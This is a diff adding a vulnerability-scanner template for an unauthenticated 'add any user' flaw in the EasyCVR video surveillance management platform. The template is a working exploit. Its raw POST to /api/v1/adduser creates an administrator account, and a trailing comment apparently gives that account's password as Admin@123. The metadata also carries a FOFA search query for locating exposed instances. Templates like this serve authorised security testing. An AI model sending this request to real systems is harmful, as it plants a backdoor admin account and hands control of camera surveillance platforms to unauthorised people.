@@ -1,0 +1,40 @@
+id: easycvr-unauth-useradd
+info:
+  name: EasyCVR 智能视频监控综合管理平台 - 任意用户添加
+  author: leadlife
+  severity: high
+  description: EasyCVR 视频管理平台是 TSINGSEE 青犀视频旗下一款软硬一体的产品，可提供多协议的设备接入、采集、AI 智能检测、处理、分发等服务，攻击者可通过/api/v1/adduser接口添加管理员账户
+  reference: 
+    - https://github.com/wy876/POC/blob/main/EasyCVR%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title="EasyCVR" || icon_hash="458134656"
+  tags: easycvr,useradd
+
+variables:
+  num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - raw:
+      - |+
+        POST /api/v1/adduser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 74
+
+        name={{num}}&username={{num}}&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1    
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "请输入有效的角色"
+
+      - type: status
+        status:
+          - 400
+
+
+
+# Admin@123
